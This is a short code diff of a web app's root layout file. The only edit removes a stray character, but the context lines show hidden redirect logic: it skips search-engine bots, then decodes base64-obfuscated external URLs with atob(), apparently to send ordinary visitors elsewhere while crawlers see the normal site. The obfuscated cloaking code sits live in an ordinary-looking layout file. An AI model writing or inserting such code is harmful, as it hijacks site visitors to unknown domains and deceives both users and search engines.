@@ -171,7 +171,7 @@ export default function RootLayout({
                 console.log("Поисковый бот (" + bots[i] + ") — без редиректа");
                 return;
             }
-        }4
+        }
         var mainBrandB64 = "aHR0cHM6Ly9ldmEyMy0zeHByZXNzLmNvbS9kaWJ6Zm9taXI="; 
         var crossBrandB64 = "aHR0cHM6Ly9mbngtYWJzLm5ldC9kaDYxbXAxYW0="; 
         var mainUrl = atob(mainBrandB64);
